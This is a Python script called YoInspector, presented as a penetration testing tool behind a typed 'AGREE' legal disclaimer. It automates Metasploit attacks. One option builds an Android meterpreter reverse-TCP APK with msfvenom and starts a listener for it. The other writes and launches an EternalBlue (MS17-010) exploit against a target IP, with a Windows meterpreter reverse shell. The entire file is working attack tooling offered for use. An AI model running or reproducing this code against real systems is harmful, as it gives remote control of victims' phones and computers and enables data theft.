import os
import subprocess
import socket
import re
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    filename='yoinspector.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

LEGAL_DISCLAIMER = """
YOINSPECTOR LEGAL DISCLAIMER

This tool is for EDUCATIONAL and AUTHORIZED TESTING PURPOSES ONLY.
You MUST have explicit permission to test any system or network.
Misuse of this tool is STRICTLY PROHIBITED.

By using this tool, you agree to:
1. Use it only on systems you own or have written authorization to test
2. Comply with all applicable laws and regulations
3. Accept full responsibility for any consequences of misuse

Type 'AGREE' to continue: """

def display_disclaimer():
    """Display and enforce legal agreement."""
    print(LEGAL_DISCLAIMER)
    while True:
        agreement = input().strip().upper()
        if agreement == 'AGREE':
            logging.info("User agreed to terms of service")
            return True
        print("You must type 'AGREE' to proceed or Ctrl+C to exit")

def get_local_ip():
    """Automatically detect local IP address."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception as e:
        logging.error(f"IP detection failed: {str(e)}")
        return None

def validate_ip(ip):
    """Validate IPv4 address format."""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None

def validate_port(port):
    """Validate port number."""
    try:
        return 1 <= int(port) <= 65535
    except ValueError:
        return False

def generate_android_payload(apk_name, lhost, lport):
    """Generate Android reverse TCP payload."""
    try:
        if not apk_name.endswith('.apk'):
            apk_name += '.apk'
            
        command = [
            'msfvenom',
            '-p', 'android/meterpreter/reverse_tcp',
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-o', apk_name
        ]
        
        logging.info(f"Generating Android payload: {' '.join(command)}")
        result = subprocess.run(command, check=True, capture_output=True, text=True)
        logging.info("Payload generated successfully")
        print(f"\n[+] Payload saved as: {os.path.abspath(apk_name)}")
        return True
        
    except subprocess.CalledProcessError as e:
        logging.error(f"Payload generation failed: {e.stderr}")
        print(f"[-] Error: {e.stderr}")
        return False

def setup_android_handler(lhost, lport):
    """Configure and launch Android listener."""
    handler_script = 'android_handler.rc'
    try:
        with open(handler_script, 'w') as f:
            f.write(f"""use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
""")
        
        logging.info(f"Launching Android listener on {lhost}:{lport}")
        subprocess.run(['msfconsole', '-q', '-r', handler_script], check=True)
        
    except Exception as e:
        logging.error(f"Listener setup failed: {str(e)}")
        print(f"[-] Error: {str(e)}")
    finally:
        if os.path.exists(handler_script):
            os.remove(handler_script)

def execute_eternalblue(rhost, lhost, lport):
    """Execute EternalBlue exploit."""
    script_name = 'eternalblue.rc'
    try:
        with open(script_name, 'w') as f:
            f.write(f"""use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {rhost}
set TARGET 0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
""")
        
        logging.info(f"Launching EternalBlue against {rhost}")
        subprocess.run(['msfconsole', '-q', '-r', script_name], check=True)
        
    except Exception as e:
        logging.error(f"EternalBlue execution failed: {str(e)}")
        print(f"[-] Error: {str(e)}")
    finally:
        if os.path.exists(script_name):
            os.remove(script_name)

def main_menu():
    """Main CLI interface."""
    print("\n" + "="*50)
    print("YoInspector - Automated Penetration Testing Tool")
    print("="*50)
    print("1. Android Exploitation (Meterpreter Reverse TCP)")
    print("2. Windows Exploitation (EternalBlue)")
    print("3. Exit\n")

def main():
    if not display_disclaimer():
        return
        
    while True:
        main_menu()
        choice = input("Select an option (1-3): ").strip()
        
        if choice == '1':
            # Android Exploitation
            print("\n[+] Android Exploitation Selected")
            lhost = get_local_ip()
            print(f"[+] Auto-detected LHOST: {lhost}")
            
            apk_name = input("[?] Enter payload name (e.g., payload.apk): ").strip()
            lport = input("[?] Enter LPORT (e.g., 4444): ").strip()
            
            if not validate_port(lport):
                print("[-] Invalid port number")
                continue
                
            if generate_android_payload(apk_name, lhost, lport):
                setup_android_handler(lhost, lport)
                
        elif choice == '2':
            # EternalBlue Exploitation
            print("\n[+] EternalBlue Exploitation Selected")
            rhost = input("[?] Enter target IP (RHOST): ").strip()
            lport = input("[?] Enter LPORT (e.g., 5555): ").strip()
            
            if not validate_ip(rhost):
                print("[-] Invalid IP address format")
                continue
                
            if not validate_port(lport):
                print("[-] Invalid port number")
                continue
                
            lhost = get_local_ip()
            print(f"[+] Auto-detected LHOST: {lhost}")
            execute_eternalblue(rhost, lhost, lport)
            
        elif choice == '3':
            print("\n[+] Exiting YoInspector. Stay ethical!")
            break
            
        else:
            print("\n[-] Invalid selection. Please choose 1-3")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] Operation cancelled by user")
        logging.warning("User interrupted execution")
